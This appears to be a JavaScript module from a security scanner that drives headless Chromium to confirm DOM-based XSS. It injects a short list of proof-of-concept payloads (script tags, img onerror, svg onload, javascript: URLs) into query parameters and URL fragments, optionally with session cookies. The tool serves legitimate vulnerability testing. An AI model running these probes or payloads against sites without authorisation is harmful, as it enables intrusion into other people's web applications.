// CYBERHUNTER AI — headless-browser DOM XSS verification.
// Executes candidate payloads in real Chromium (puppeteer) and confirms the
// script actually fires — detected via alert/confirm/prompt dialog OR a
// window marker for apps that fully decode the payload. Complements the
// static source→sink analysis, which can only say "potential".

import puppeteer from "puppeteer";

// Two detection channels:
//  - alert(1) variants  → browser fires a dialog event (popup proof)
//  - window.__CYBERHUNTER_XSS=1 → survives apps that suppress dialogs, but
//    NOTE: '=' may stay percent-encoded through decodeURI()-only sinks, so
//    these are a secondary signal alongside dialog detection.
const PAYLOADS = [
  `<script>alert(1)</script>`,
  `<script>window.__CYBERHUNTER_XSS=1</script>`,
  `<img src=x onerror=alert(1)>`,
  `<img src=x onerror="window.__CYBERHUNTER_XSS=1">`,
  `'><svg/onload=alert(1)>`,
  `"><svg/onload=window.__CYBERHUNTER_XSS=1>`,
  `javascript:alert(1)`,
];

let browser = null;

async function getBrowser() {
  if (!browser || !browser.connected) {
    browser = await puppeteer.launch({
      headless: true,
      args: ["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"],
    });
  }
  return browser;
}

// candidates: [{ url, params: ["default", ...] }]
// authCookie: optional "k=v; k2=v2" session string — required for DOM XSS
// behind login, since the headless browser starts with an empty jar.
export async function verifyDomXss(candidates, log = () => {}, authCookie = "") {
  let br;
  try {
    br = await getBrowser();
  } catch (e) {
    log(`[DOM-XSS] headless browser unavailable: ${e.message}`);
    return [];
  }
  const page = await br.newPage();
  const confirmed = [];

  // session cookies scoped per-candidate-origin (never leaked cross-origin)
  const cookiePairs = (authCookie || "").split(";").map((s) => s.trim()).filter(Boolean)
    .map((p) => { const i = p.indexOf("="); return i > 0 ? { name: p.slice(0, i).trim(), value: p.slice(i + 1).trim() } : null; })
    .filter(Boolean);
  const applyCookies = async (pageUrl) => {
    if (!cookiePairs.length) return;
    try {
      await page.setCookie(...cookiePairs.map((c) => ({ ...c, url: pageUrl })));
    } catch { /* cookie format/domain quirks — continue without */ }
  };

  let dialogFired = false;
  page.on("dialog", (d) => { dialogFired = true; d.dismiss().catch(() => {}); });

  const tryUrl = async (u) => {
    dialogFired = false;
    try {
      await page.goto(u.toString(), { waitUntil: "domcontentloaded", timeout: 10000 });
      await new Promise((r) => setTimeout(r, 800));
      const flag = await page.evaluate(() => window.__CYBERHUNTER_XSS === 1).catch(() => false);
      return dialogFired || flag;
    } catch { return false; }
  };

  for (const c of (candidates ?? []).slice(0, 6)) {
    await applyCookies(c.url);
    log(`[DOM-XSS] testing ${new URL(c.url).pathname} params=[${(c.params ?? []).join(",")}]`);
    for (const param of (c.params ?? []).slice(0, 4)) {
      let hit = null;
      for (const payload of PAYLOADS) {
        // pass 1: query parameter
        try {
          const uq = new URL(c.url);
          uq.searchParams.set(param, payload);
          if (await tryUrl(uq)) { hit = { url: uq.toString(), param, payload, via: "query" }; break; }
        } catch { /* skip */ }
        // pass 2: URL fragment — many DOM XSS sinks read location.hash
        try {
          const uh = new URL(c.url);
          uh.hash = `${param}=${payload}`;
          if (await tryUrl(uh)) { hit = { url: uh.toString(), param, payload, via: "fragment" }; break; }
        } catch { /* skip */ }
      }
      if (hit) {
        confirmed.push(hit);
        log(`[DOM-XSS] CONFIRMED ${hit.param} (${hit.via}) @ ${new URL(hit.url).pathname} → ${hit.payload.slice(0, 60)}`);
        break; // one confirmed param per page is enough evidence
      }
    }
  }
  await page.close().catch(() => {});
  return confirmed;
}

export async function closeDomXss() {
  try { await browser?.close(); } catch { /* ignore */ }
  browser = null;
}
